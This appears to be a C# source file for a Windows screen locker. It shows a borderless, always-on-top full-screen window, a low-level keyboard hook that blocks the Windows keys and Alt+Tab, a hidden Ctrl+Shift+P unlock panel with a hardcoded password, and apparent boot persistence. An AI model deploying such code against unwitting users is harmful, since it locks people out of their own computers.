using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ChecSumAutoBoot;

namespace ChecSumAutoBoot
{
    public partial class Screen : Form
    {

        private const string CorrectPassword = "115599**";


        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        public Screen()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Maximized;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.KeyPreview = true;
            this.KeyDown += new KeyEventHandler(Screen_KeyDown);
            this.txtPassword.KeyPress += new KeyPressEventHandler(txtPassword_KeyPress);
            ContextMenuStrip contextMenu = new ContextMenuStrip();
            txtPassword.ContextMenuStrip = contextMenu;


            _proc = HookCallback;
            _hookID = SetHook(_proc);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Windows tuşunu engelle
                if (vkCode == (int)Keys.LWin || vkCode == (int)Keys.RWin)
                {
                    return (IntPtr)1; // Engelle
                }

                // Alt + Tab tuş kombinasyonunu engelle
                if ((Control.ModifierKeys & Keys.Alt) == Keys.Alt && vkCode == (int)Keys.Tab)
                {
                    return (IntPtr)1; // Engelle
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private void Screen_Load(object sender, EventArgs e)
        {
            panelPassword.Location = new Point((this.ClientSize.Width - panelPassword.Width) / 2, (this.ClientSize.Height - panelPassword.Height) / 2);
            this.Focus(); // Ensure the form has focus
        }

        private void Screen_KeyDown(object sender, KeyEventArgs e)
        {
            //if (e.KeyCode == Keys.Escape)
            //{
            //    // Kullanıcıdan onay al
            //    var result = MessageBox.Show("Uygulamayı kapatmak istiyor musunuz?", "Onay", MessageBoxButtons.YesNo);
            //    if (result == DialogResult.Yes)
            //    {
            //        this.Close();
            //        Application.Exit();
            //    }
            //}
            if (e.Alt && e.KeyCode == Keys.Tab)
            {
                e.SuppressKeyPress = true; // Engelle
                e.Handled = true; // Engelle
            }
            if (e.Control && e.Shift && e.KeyCode == Keys.P)
            {
                panelPassword.Visible = true;
                txtPassword.Focus();
            }
        }


        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID); // Remove the hook
            base.OnFormClosing(e);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
        }

        private void btnSubmit_Click(object sender, EventArgs e)
        {
            if (txtPassword.Text == CorrectPassword)
            {
                CheckSumAutoBoot.Clear();
                MessageBox.Show("The password is correct! The application is closing.");
                Application.Exit(); // Uygulamayı kapatır
            }
            else
            {
                MessageBox.Show("Password incorrect! Please try again.");
                txtPassword.Clear(); // TextBox'ı temizle
            }
        }
        private void txtPassword_KeyPress(object sender, KeyPressEventArgs e)
        {
            // Yapıştırma işlemi (Ctrl+V)
            if (e.KeyChar == (char)22) // Ctrl+V ASCII değeri
            {
                e.Handled = true; // Tuş basımını engelle
            }
        }


        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }
    }
}
